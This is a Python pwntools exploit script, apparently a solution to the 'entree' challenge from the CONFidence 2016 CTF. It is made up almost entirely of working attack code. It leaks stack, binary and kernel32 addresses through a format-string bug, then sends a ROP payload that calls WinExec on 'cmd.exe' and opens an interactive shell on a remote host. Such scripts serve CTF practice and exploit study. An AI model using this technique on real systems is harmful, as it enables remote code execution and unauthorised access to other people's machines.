
from pwn import *
 
LOCAL = False

def pwn():
    log.info("entree - CONFidence 2016 CTF - mphx2")
    target.recvuntil("bytes: ")
    target.sendline("300")
    target.recvuntil("data: ")
    target.sendline("%p"*(300/2))
    leak = target.recvuntil("bytes: ")

    log.info("leaking stack ptr, kernel32.dll & base addresses")

    stack = int(leak[33:41],16)
    stack =  stack - 0x58

    base_bin = int(leak[41:49],16)
    base_bin = base_bin - 0x1738

    kernel32 = int(leak[185:193],16)
    kernel32 = kernel32 - 0x28543

    log.success ("stack    ptr  address at: %#x", stack)
    log.success ("PE       base address at: %#x", base_bin)
    log.success ("kernel32 base address at: %#x", kernel32)

    log.info("exploiting the null ptr")

    winexec = kernel32 + 0x23087
    cmd = stack + 0x2c

    rop="A"+p32(winexec)+"CCCC"+p32(cmd)+"B"*32+"cmd.exe"+"\x00"

    target.sendline("%#x" % (stack + len(rop)))
    target.sendline()
    target.recvuntil("Enter data: ")
    target.sendline(rop[::-1]+"A"*0xfffff)

    target.interactive()
 
def main():
        global target
        if LOCAL:
                target = process("./fetusheap")
                
        else:
                target = remote("192.168.10.158", 4444)
        pwn()
 
if __name__ == "__main__":
    main()
